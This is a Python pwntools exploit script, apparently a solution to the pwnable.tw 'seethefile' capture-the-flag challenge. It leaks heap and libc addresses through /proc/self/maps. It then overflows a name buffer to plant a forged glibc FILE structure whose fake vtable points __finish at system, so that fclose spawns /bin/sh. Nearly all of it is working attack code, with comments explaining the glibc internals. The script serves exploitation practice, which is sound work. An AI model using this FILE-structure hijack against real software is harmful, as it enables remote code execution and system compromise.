#! usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10200)

    return r


def _open(filename: str):
    r.sendlineafter(b":", b"1")
    r.sendlineafter(b":", filename.encode("ascii"))


def _read():
    r.sendlineafter(b":", b"2")


def _print() -> bytes:
    r.sendlineafter(b":", b"3")
    return r.recvuntil(b"---------------MENU---------------", drop = True)


def _close(filename: str):
    r.sendlineafter(b":", b"4")


def _exit(name: bytes):
    r.sendlineafter(b":", b"5")
    r.sendlineafter(b":", name)


# https://blog.srikavin.me/posts/pwnable-tw-seethefile/
# https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
def main():
    r = conn()

    _open("/proc/self/maps")
    _read()
    _read()

    leaks = _print().split(b"\n")
    heap = int(leaks[1][:8], 16)
    libc.address = int(leaks[2][:8], 16)

    log.info(f"heap @ 0x{heap:x}")
    log.info(f"libc @ 0x{libc.address:x}")

    """
    int
    attribute_compat_text_section
    _IO_old_fclose (_IO_FILE *fp)
    {
      int status;

      CHECK_FILE(fp, EOF);

      /* We desperately try to help programs which are using streams in a
         strange way and mix old and new functions.  Detect new streams
         here.  */
      if (fp->_vtable_offset == 0)
        return _IO_new_fclose (fp);

      /* First unlink the stream.  */
      if (fp->_IO_file_flags & _IO_IS_FILEBUF)      <<<-----1-----<<<
        _IO_un_link ((struct _IO_FILE_plus *) fp);

      _IO_acquire_lock (fp);                        <<<-----2-----<<<
      if (fp->_IO_file_flags & _IO_IS_FILEBUF)
        status = _IO_old_file_close_it (fp);
      else
        status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
      _IO_release_lock (fp);
      _IO_FINISH (fp);
      if (_IO_have_backup (fp))
        _IO_free_backup_area (fp);
      if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
        {
          fp->_IO_file_flags = 0;
          free(fp);
        }

      return status;
    }
    """

    # >>>-----1-----<<<
    # We can skip large chunks of this function if _IO_IS_FILEBUF is not set.
    # Looking at the source code of libc, I found that the bit mask for _IO_IS_FILEBUF is 0x2000.
    # The bitwise NOT is 0xFFFFDFFF, so we can set the flags of our fake FILE struct to that.
    fake_file = flat(
                    0xFFFFDFFF,         # file->_flags  (set _IO_IS_FILEBUF bit to false)
                    b";/bin/sh\0\0\0\0" # This should overlap the following pointers the this manner:
                                        # char* _IO_read_ptr   =  ";/bi"
                                        # char* _IO_read_end   =  "n/sh"
                                        # char* _IO_read_base  =  "\0\0\0\0"
                )

    """
    typedef struct { 
        int lock; 
        int cnt; 
        void *owner;
    } _IO_lock_t;
    """

    # >>>-----2-----<<<
    # _lock is locked if _lock->cnt != 0.
    # Thus, if we set _lock to a buffer of zeroes, libc will be able to aquire the lock by incrementing cnt.
    # Similarly, its counterpart, _IO_release_lock decrements cnt.
    # A good target buffer is the end of the filename buffer.
    # 
    # The _IO_FILE_plus struct contains a field named vtable.
    # This field acts as a jump table containing virtual functions that are used when interacting with the file.
    #
    # See struct below for clarifications.
    payload = flat(
                    fake_file.ljust(0x20, b"A"),
                    exe.sym.name,           # Overwrite fp saved after name[32]
                    b"A" * 36,
                    exe.sym.filename + 48,  # _IO_lock_t *_lock will point to the end of filename buffer

                    exe.sym.name + 72,      # _IO_jump_t *vtable will point to the previous value in the payload.
                                            # This because we need two dummy values and a pointer to a function
                                            # (in this case will be `system` for the `__finish` pointer.
                    
                    libc.sym.system         # When fclose(FILE *ptr) is called, the function pointer stored in
                                            # the `__finish` field in the struct will be called after freeing
                                            # internal structures. The rest of the structure isn't necessary
                                            # in this case.
                )

    """
    struct _IO_jump_t
    {
        JUMP_FIELD(size_t, __dummy);            <----- filename+48
        JUMP_FIELD(size_t, __dummy2);           <----- name+72
        JUMP_FIELD(_IO_finish_t, __finish);     <----- &system
        JUMP_FIELD(_IO_overflow_t, __overflow);
        JUMP_FIELD(_IO_underflow_t, __underflow);
        JUMP_FIELD(_IO_underflow_t, __uflow);
        JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
        /* showmany */
        JUMP_FIELD(_IO_xsputn_t, __xsputn);
        JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
        JUMP_FIELD(_IO_seekoff_t, __seekoff);
        JUMP_FIELD(_IO_seekpos_t, __seekpos);
        JUMP_FIELD(_IO_setbuf_t, __setbuf);
        JUMP_FIELD(_IO_sync_t, __sync);
        JUMP_FIELD(_IO_doallocate_t, __doallocate);
        JUMP_FIELD(_IO_read_t, __read);
        JUMP_FIELD(_IO_write_t, __write);
        JUMP_FIELD(_IO_seek_t, __seek);
        JUMP_FIELD(_IO_close_t, __close);
        JUMP_FIELD(_IO_stat_t, __stat);
        JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
        JUMP_FIELD(_IO_imbue_t, __imbue);
    };
    """

    _exit(payload)

    r.interactive("$ ")


if __name__ == "__main__":
    main()
